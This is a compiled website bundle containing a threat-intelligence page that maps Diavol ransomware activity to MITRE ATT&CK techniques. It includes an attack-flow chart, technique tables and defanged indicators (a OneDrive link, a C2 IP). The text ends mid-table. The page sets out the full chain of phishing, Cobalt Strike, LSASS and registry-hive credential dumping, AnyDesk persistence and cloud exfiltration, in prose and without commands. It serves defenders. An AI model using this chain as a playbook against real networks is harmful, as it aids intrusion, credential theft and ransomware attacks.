"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[8261],{3248:function(e,t,a){var n=a(7294),r=a(7273);r.Z.initialize({startOnLoad:!0});t.Z=function(e){var t=e.chart;return(0,n.useEffect)((function(){r.Z.contentLoaded()}),[]),n.createElement("div",{className:"mermaid"},t)}},2509:function(e,t,a){a.r(t),a.d(t,{frontMatter:function(){return d},contentTitle:function(){return s},metadata:function(){return m},toc:function(){return k},default:function(){return p}});var n=a(7462),r=a(3366),l=(a(7294),a(4137)),i=a(3248),o=["components"],d={},s=void 0,m={unversionedId:"Sightings/Diavol_Ransomware",id:"Sightings/Diavol_Ransomware",isDocsHomePage:!1,title:"Diavol_Ransomware",description:"Overview",source:"@site/docs/03-Sightings/02-Diavol_Ransomware.md",sourceDirName:"03-Sightings",slug:"/Sightings/Diavol_Ransomware",permalink:"/ac3-threat-sightings/docs/Sightings/Diavol_Ransomware",tags:[],version:"current",sidebarPosition:2,frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Darkside_Ransomware",permalink:"/ac3-threat-sightings/docs/Sightings/Darkside_Ransomware"},next:{title:"Conti_Ransomware",permalink:"/ac3-threat-sightings/docs/Sightings/Conti_Ransomware"}},k=[{value:"Overview",id:"overview",children:[{value:"References:",id:"references",children:[]},{value:"Threat Actor Activity",id:"threat-actor-activity",children:[]},{value:"Count of documented TTPs by Tactic",id:"count-of-documented-ttps-by-tactic",children:[]},{value:"Attack Flow",id:"attack-flow",children:[]}]},{value:"Tactics, Techniques and Procedures",id:"tactics-techniques-and-procedures",children:[]},{value:"Tactics, Techniques, Procedures, Observables and Notes",id:"tactics-techniques-procedures-observables-and-notes",children:[]},{value:"TTP Profiles with Observables",id:"ttp-profiles-with-observables",children:[{value:"Threat Actor used <em>Emails</em> with malicious hyperlinks to <em>OneDrive</em> for Initial Access.",id:"threat-actor-used-emails-with-malicious-hyperlinks-to-onedrive-for-initial-access",children:[]},{value:"Threat Actor used <em>zipped .ISO</em> files to distribute BazarLoader malware for Defense Evasion.",id:"threat-actor-used-zipped-iso-files-to-distribute-bazarloader-malware-for-defense-evasion",children:[]},{value:"Threat Actor used <em>.LNK</em> files in <em>.ISO</em> files to lure users for Execution.",id:"threat-actor-used-lnk-files-in-iso-files-to-lure-users-for-execution",children:[]},{value:"Threat Actor used <em>RUNDLL32</em> to execute <em>.DLL</em> payloads for Defense Evasion.",id:"threat-actor-used-rundll32-to-execute-dll-payloads-for-defense-evasion",children:[]},{value:"BazarLoader used <em>BITSadmin</em> command-line callbacks for Persistence.",id:"bazarloader-used-bitsadmin-command-line-callbacks-for-persistence",children:[]},{value:"BazarLoader used a well known set of <em>net.exe</em> and <em>nltest.exe</em> commands for Discovery.",id:"bazarloader-used-a-well-known-set-of-netexe-and-nltestexe-commands-for-discovery",children:[]},{value:"BazarLoader used HTTP protocol to download <em>Cobalt Strike</em> Beacon DLL files for Command And Control.",id:"bazarloader-used-http-protocol-to-download-cobalt-strike-beacon-dll-files-for-command-and-control",children:[]},{value:"Threat Actor used process injection into <em>Edge browser</em> to launch <em>Cobalt Strike</em> post-exploitation tasks for Defense Evasion.",id:"threat-actor-used-process-injection-into-edge-browser-to-launch-cobalt-strike-post-exploitation-tasks-for-defense-evasion",children:[]},{value:"Threat Actor used <em>Cobalt Strike</em> to execute <em>ipconfig</em> and <em>net user</em> commands for Discovery.",id:"threat-actor-used-cobalt-strike-to-execute-ipconfig-and-net-user-commands-for-discovery",children:[]},{value:"Threat Actor used <em>Cobalt Strike</em> to execute a well-known <em>AdFind</em> recon script for Discovery.",id:"threat-actor-used-cobalt-strike-to-execute-a-well-known-adfind-recon-script-for-discovery",children:[]},{value:"Threat Actor used a <em>CMD</em> batch script to dump SAM, SECURITY and SYSTEM registry hives via Reg.exe for Credential Access.",id:"threat-actor-used-a-cmd-batch-script-to-dump-sam-security-and-system-registry-hives-via-regexe-for-credential-access",children:[]},{value:"Threat Actor used <em>MORE.COM</em> command-line tool to access Web Browser internal files for Credential Access.",id:"threat-actor-used-morecom-command-line-tool-to-access-web-browser-internal-files-for-credential-access",children:[]},{value:"Threat Actor used <em>Rubeus.exe</em> for Credential Access.",id:"threat-actor-used-rubeusexe-for-credential-access",children:[]},{value:"Threat Actor used multiple system utilities for Discovery.",id:"threat-actor-used-multiple-system-utilities-for-discovery",children:[]},{value:"Threat Actor used <em>PowerShell</em> and <em>CMD</em> to install <em>AnyDesk</em> for Persistence.",id:"threat-actor-used-powershell-and-cmd-to-install-anydesk-for-persistence",children:[]},{value:"Threat Actor used <em>RDP</em> to install <em>FileZilla</em> for Exfiltration.",id:"threat-actor-used-rdp-to-install-filezilla-for-exfiltration",children:[]},{value:"Threat Actor used <em>Task Manager</em> to dump LSASS process memory for Credential Access.",id:"threat-actor-used-task-manager-to-dump-lsass-process-memory-for-credential-access",children:[]},{value:"Threat Actor used <em>Web browser</em> to upload LSASS dump file to Cloud Storage for Exfiltration.",id:"threat-actor-used-web-browser-to-upload-lsass-dump-file-to-cloud-storage-for-exfiltration",children:[]},{value:"Threat Actor used <em>RDP</em> to download and execute portable version of <em>Advanced_IP_Scanner</em> for Discovery.",id:"threat-actor-used-rdp-to-download-and-execute-portable-version-of-advanced_ip_scanner-for-discovery",children:[]},{value:"Threat Actor used <em>MSSQLUDPScanner.exe</em> MSSQL tool for Discovery.",id:"threat-actor-used-mssqludpscannerexe-mssql-tool-for-discovery",children:[]},{value:"Threat Actor used well known batch file -<em>kill.bat</em>- to inhibit system recovery for Impact.",id:"threat-actor-used-well-known-batch-file--killbat--to-inhibit-system-recovery-for-impact",children:[]},{value:"Threat Actor used <em>RDP</em> to execute Diavol Ransomware binary manually on targets for Impact.",id:"threat-actor-used-rdp-to-execute-diavol-ransomware-binary-manually-on-targets-for-impact",children:[]}]}],u={toc:k};function p(e){var t=e.components,a=(0,r.Z)(e,o);return(0,l.kt)("wrapper",(0,n.Z)({},u,a,{components:t,mdxType:"MDXLayout"}),(0,l.kt)("h2",{id:"overview"},"Overview"),(0,l.kt)("p",null,"Threat Sighting for Diavol Ransomware TTPs based on the report published by @TheDFIRReport."),(0,l.kt)("p",null,"This document is a summary of the extracted TTPs. For full details please refer to the AC3 Threat Sighting (.yml file) at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Diavol_Ransomware.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Diavol_Ransomware.yml")),(0,l.kt)("p",null,"Author: Alejandro Houspanossian (@lekz86)"),(0,l.kt)("p",null,"Acknowledgements: @TheDFIRReport"),(0,l.kt)("h3",{id:"references"},"References:"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://thedfirreport.com/2021/12/13/diavol-ransomware/"},"https://thedfirreport.com/2021/12/13/diavol-ransomware/")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.ic3.gov/Media/News/2022/220120.pdf"},"https://www.ic3.gov/Media/News/2022/220120.pdf")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.scythe.io/library/adversary-emulation-diavol-ransomware-threatthursday"},"https://www.scythe.io/library/adversary-emulation-diavol-ransomware-threatthursday"))),(0,l.kt)("h3",{id:"threat-actor-activity"},"Threat Actor Activity"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"Emails")," with malicious hyperlinks to ",(0,l.kt)("em",{parentName:"li"},"OneDrive")," for Initial Access."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"zipped .ISO")," files to distribute BazarLoader malware for Defense Evasion."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},".LNK")," files in ",(0,l.kt)("em",{parentName:"li"},".ISO")," files to lure users for Execution."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"RUNDLL32")," to execute ",(0,l.kt)("em",{parentName:"li"},".DLL")," payloads for Defense Evasion."),(0,l.kt)("li",{parentName:"ul"},"BazarLoader used ",(0,l.kt)("em",{parentName:"li"},"BITSadmin")," command-line callbacks for Persistence."),(0,l.kt)("li",{parentName:"ul"},"BazarLoader used a well known set of ",(0,l.kt)("em",{parentName:"li"},"net.exe")," and ",(0,l.kt)("em",{parentName:"li"},"nltest.exe")," commands for Discovery."),(0,l.kt)("li",{parentName:"ul"},"BazarLoader used HTTP protocol to download ",(0,l.kt)("em",{parentName:"li"},"Cobalt Strike")," Beacon DLL files for Command And Control."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used process injection into ",(0,l.kt)("em",{parentName:"li"},"Edge browser")," to launch ",(0,l.kt)("em",{parentName:"li"},"Cobalt Strike")," post-exploitation tasks for Defense Evasion."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"Cobalt Strike")," to execute ",(0,l.kt)("em",{parentName:"li"},"ipconfig")," and ",(0,l.kt)("em",{parentName:"li"},"net user")," commands for Discovery."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"Cobalt Strike")," to execute a well-known ",(0,l.kt)("em",{parentName:"li"},"AdFind")," recon script for Discovery."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used a ",(0,l.kt)("em",{parentName:"li"},"CMD")," batch script to dump SAM, SECURITY and SYSTEM registry hives via Reg.exe for Credential Access."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"MORE.COM")," command-line tool to access Web Browser internal files for Credential Access."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"Rubeus.exe")," for Credential Access."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used multiple system utilities for Discovery."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"PowerShell")," and ",(0,l.kt)("em",{parentName:"li"},"CMD")," to install ",(0,l.kt)("em",{parentName:"li"},"AnyDesk")," for Persistence."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"RDP")," to install ",(0,l.kt)("em",{parentName:"li"},"FileZilla")," for Exfiltration."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"Task Manager")," to dump LSASS process memory for Credential Access."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"Web browser")," to upload LSASS dump file to Cloud Storage for Exfiltration."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"RDP")," to download and execute portable version of ",(0,l.kt)("em",{parentName:"li"},"Advanced_IP_Scanner")," for Discovery."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"MSSQLUDPScanner.exe")," MSSQL tool for Discovery."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used well known batch file -",(0,l.kt)("em",{parentName:"li"},"kill.bat"),"- to inhibit system recovery for Impact."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"RDP")," to execute Diavol Ransomware binary manually on targets for Impact.")),(0,l.kt)("h3",{id:"count-of-documented-ttps-by-tactic"},"Count of documented TTPs by Tactic"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"# Documented TTPs"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"++ (2)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Exfiltration"),(0,l.kt)("td",{parentName:"tr",align:null},"++ (2)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"++ (2)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"+++ (3)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"++++ (4)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"++++++ (6)")))),(0,l.kt)("h3",{id:"attack-flow"},"Attack Flow"),(0,l.kt)("p",null,"The chart below shows a graphical representation of the attack flow."),(0,l.kt)(i.Z,{chart:"\ngraph LR\nIA[Initial Access] --\x3e | _Emails_ with malicious hyperlinks to _OneDrive_| IA[Initial Access]\nIA[Initial Access] --\x3e | _zipped .ISO_ files to distribute BazarLoader malware| DE[Defense Evasion]\nDE[Defense Evasion] --\x3e | _.LNK_ files in _.ISO_ files to lure users| EXE[Execution]\nEXE[Execution] --\x3e | _RUNDLL32_ to execute _.DLL_ payloads| DE[Defense Evasion]\nDE[Defense Evasion] --\x3e | _BITSadmin_ command-line callbacks| PER[Persistence]\nEXE[Execution] --\x3e | a well known set of _net.exe_ and _nltest.exe_ commands| D[Discovery]\nEXE[Execution] --\x3e | HTTP protocol to download _Cobalt Strike_ Beacon DLL files| C2[Command And Control]\nC2[Command And Control] --\x3e | process injection into _Edge browser_ to launch _Cobalt Strike_ post-exploitation tasks| DE[Defense Evasion]\nC2[Command And Control] --\x3e | _Cobalt Strike_ to execute _ipconfig_ and _net user_ commands| D[Discovery]\nC2[Command And Control] --\x3e | _Cobalt Strike_ to execute a well-known _AdFind_ recon script| D[Discovery]\nC2[Command And Control] --\x3e | a _CMD_ batch script to dump SAM, SECURITY and SYSTEM registry hives via Reg.exe| CA[Credential Access]\nC2[Command And Control] --\x3e | _MORE.COM_ command-line tool to access Web Browser internal files| CA[Credential Access]\nC2[Command And Control] --\x3e | _Rubeus.exe_| CA[Credential Access]\nC2[Command And Control] --\x3e | multiple system utilities| D[Discovery]\nC2[Command And Control] --\x3e | _PowerShell_ and _CMD_ to install _AnyDesk_| PER[Persistence]\nLatM[Lateral Movement] --\x3e | _RDP_ to install _FileZilla_| EXFIL[Exfiltration]\nLatM[Lateral Movement] --\x3e | _Task Manager_ to dump LSASS process memory| CA[Credential Access]\nLatM[Lateral Movement] --\x3e | _Web browser_ to upload LSASS dump file to Cloud Storage| EXFIL[Exfiltration]\nLatM[Lateral Movement] --\x3e | _RDP_ to download and execute portable version of _Advanced_IP_Scanner_| D[Discovery]\nLatM[Lateral Movement] --\x3e | _MSSQLUDPScanner.exe_ MSSQL tool| D[Discovery]\nEXE[Execution] --\x3e | well known batch file -_kill.bat_- to inhibit system recovery| IMP[Impact]\nEXE[Execution] --\x3e | _RDP_ to execute Diavol Ransomware binary manually on targets| IMP[Impact]\n",mdxType:"Mermaid"}),(0,l.kt)("h2",{id:"tactics-techniques-and-procedures"},"Tactics, Techniques and Procedures"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1566.002 - Phishing: Spearphishing Link",(0,l.kt)("br",null),"T1204.001 - User Execution: Malicious Link",(0,l.kt)("br",null),"T1105 - Ingress Tool Transfer"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Emails")," with malicious hyperlinks to ",(0,l.kt)("em",{parentName:"td"},"OneDrive")," for Initial Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1553.005 - Subvert Trust Controls: Mark-of-the-Web Bypass"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"zipped .ISO")," files to distribute BazarLoader malware for Defense Evasion.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002 - User Execution: Malicious File",(0,l.kt)("br",null),"T1553.005 - Subvert Trust Controls: Mark-of-the-Web Bypass"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},".LNK")," files in ",(0,l.kt)("em",{parentName:"td"},".ISO")," files to lure users for Execution.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011 - Signed Binary Proxy Execution: Rundll32"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"RUNDLL32")," to execute ",(0,l.kt)("em",{parentName:"td"},".DLL")," payloads for Defense Evasion.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1197 - BITS Jobs",(0,l.kt)("br",null),"T1218.011 - Signed Binary Proxy Execution: Rundll32"),(0,l.kt)("td",{parentName:"tr",align:null},"BazarLoader used ",(0,l.kt)("em",{parentName:"td"},"BITSadmin")," command-line callbacks for Persistence.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1069.001 - Permission Groups Discovery: Local Groups",(0,l.kt)("br",null),"T1069.002 - Permission Groups Discovery: Domain Groups",(0,l.kt)("br",null),"T1482 - Domain Trust Discovery",(0,l.kt)("br",null),"T1018 - Remote System Discovery",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"BazarLoader used a well known set of ",(0,l.kt)("em",{parentName:"td"},"net.exe")," and ",(0,l.kt)("em",{parentName:"td"},"nltest.exe")," commands for Discovery.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001 - Application Layer Protocol: Web Protocols",(0,l.kt)("br",null),"T1218.011 - Signed Binary Proxy Execution: Rundll32",(0,l.kt)("br",null),"T1105 - Ingress Tool Transfer"),(0,l.kt)("td",{parentName:"tr",align:null},"BazarLoader used HTTP protocol to download ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," Beacon DLL files for Command And Control.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1055 - Process Injection",(0,l.kt)("br",null),"T1018 - Remote System Discovery",(0,l.kt)("br",null),"T1218.011 - Signed Binary Proxy Execution: Rundll32"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used process injection into ",(0,l.kt)("em",{parentName:"td"},"Edge browser")," to launch ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," post-exploitation tasks for Defense Evasion.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1018 - Remote System Discovery",(0,l.kt)("br",null),"T1218.011 - Signed Binary Proxy Execution: Rundll32"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," to execute ",(0,l.kt)("em",{parentName:"td"},"ipconfig")," and ",(0,l.kt)("em",{parentName:"td"},"net user")," commands for Discovery.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011 - Signed Binary Proxy Execution: Rundll32",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell",(0,l.kt)("br",null),"T1016 - System Network Configuration Discovery",(0,l.kt)("br",null),"T1482 - Domain Trust Discovery",(0,l.kt)("br",null),"T1036 - Masquerading"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," to execute a well-known ",(0,l.kt)("em",{parentName:"td"},"AdFind")," recon script for Discovery.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1003.002 - Security Account Manager",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used a ",(0,l.kt)("em",{parentName:"td"},"CMD")," batch script to dump SAM, SECURITY and SYSTEM registry hives via Reg.exe for Credential Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1555.003 - Credentials from Web Browsers",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"MORE.COM")," command-line tool to access Web Browser internal files for Credential Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting",(0,l.kt)("br",null),"T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Rubeus.exe")," for Credential Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1016 - System Network Configuration Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used multiple system utilities for Discovery.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001 - Application Layer Protocol: Web Protocols",(0,l.kt)("br",null),"T1059.001 - Command and Scripting Interpreter: PowerShell",(0,l.kt)("br",null),"T1219 - Remote Access Software",(0,l.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," and ",(0,l.kt)("em",{parentName:"td"},"CMD")," to install ",(0,l.kt)("em",{parentName:"td"},"AnyDesk")," for Persistence.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Exfiltration"),(0,l.kt)("td",{parentName:"tr",align:null},"T1048 - Exfiltration Over Alternative Protocol",(0,l.kt)("br",null),"T1021.001 - Remote Services: Remote Desktop Protocol"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"RDP")," to install ",(0,l.kt)("em",{parentName:"td"},"FileZilla")," for Exfiltration.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1021.001 - Remote Services: Remote Desktop Protocol",(0,l.kt)("br",null),"T1003.001 - OS Credential Dumping: LSASS Memory"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Task Manager")," to dump LSASS process memory for Credential Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Exfiltration"),(0,l.kt)("td",{parentName:"tr",align:null},"T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Web browser")," to upload LSASS dump file to Cloud Storage for Exfiltration.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1021.001 - Remote Services: Remote Desktop Protocol",(0,l.kt)("br",null),"T1105 - Ingress Tool Transfer",(0,l.kt)("br",null),"T1046 - Network Service Scanning"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"RDP")," to download and execute portable version of ",(0,l.kt)("em",{parentName:"td"},"Advanced_IP_Scanner")," for Discovery.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1046 - Network Service Scanning"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"MSSQLUDPScanner.exe")," MSSQL tool for Discovery.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001 - Impair Defenses: Disable or Modify Tools",(0,l.kt)("br",null),"T1490 - Inhibit System Recovery"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used well known batch file -",(0,l.kt)("em",{parentName:"td"},"kill.bat"),"- to inhibit system recovery for Impact.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"T1486 - Data Encrypted for Impact",(0,l.kt)("br",null),"T1491.001 - Defacement: Internal Defacement",(0,l.kt)("br",null),"T1021.001 - Remote Services: Remote Desktop Protocol"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"RDP")," to execute Diavol Ransomware binary manually on targets for Impact.")))),(0,l.kt)("h2",{id:"tactics-techniques-procedures-observables-and-notes"},"Tactics, Techniques, Procedures, Observables and Notes"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"),(0,l.kt)("th",{parentName:"tr",align:null},"Notes"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1566.002",(0,l.kt)("br",null),"T1204.001",(0,l.kt)("br",null),"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Emails")," with malicious hyperlinks to ",(0,l.kt)("em",{parentName:"td"},"OneDrive")," for Initial Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Link"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"/onedrive.live[.]com/download?cid=0094E8452D7CDD65&resid=94E8452D7CDD65%21135&authkey=AEN3yDYOia1YdKM"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\Downloads\\new-documents-2005.zip")),(0,l.kt)("td",{parentName:"tr",align:null},"- Connects to /159.223.31","[.]","75/body/athlete")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1553.005"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"zipped .ISO")," files to distribute BazarLoader malware for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- 